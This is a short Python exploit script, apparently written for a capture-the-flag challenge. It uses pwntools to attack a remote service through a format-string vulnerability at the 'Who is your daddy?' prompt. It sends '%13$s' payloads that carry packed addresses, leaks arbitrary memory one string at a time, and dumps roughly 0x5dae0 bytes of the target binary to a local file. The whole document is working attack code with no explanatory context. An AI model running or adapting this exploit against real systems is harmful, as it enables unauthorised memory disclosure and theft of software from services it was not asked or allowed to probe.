#!/usr/bin/env python

from pwntools import *

@MemLeak
@MemLeak.NoNewlines
@MemLeak.String
def leak(addr):
  old_level = context.log_level
  context.log_level = 'error'
  r = remote(ADDR, PORT)
  context.log_level = old_level
  r.recvuntil('Who is your daddy? ', drop=True)
  r.sendline('%13$s|||' + '%c'*16  + p64(addr))
  old_level = context.log_level
  context.log_level = 'debug'
  a = r.recvuntil('|||', drop=True)
  log.debug('leaked {} => {}'.format(hex(addr), repr(a)))
  context.log_level = 'error'
  r.close()
  context.log_level = old_level
  return a

def dump_binary(addr, length = 0x10000):
  current = addr
  dumped = ''
  while current < addr + length:
    s = leak(current)
    if s == None:
      dumped += '\x00'
      current += 1
      continue
    else:
      dumped += s
      current += len(s)
  return dumped

def save_file(filename, content):
  print 'generating %s.. [size: %d]' % (filename, len(content))
  f = open(filename, 'w')
  f.write(content)
  f.close()

binary = dump_binary(0x10000, 0x5dae0)
save_file('binary', binary)

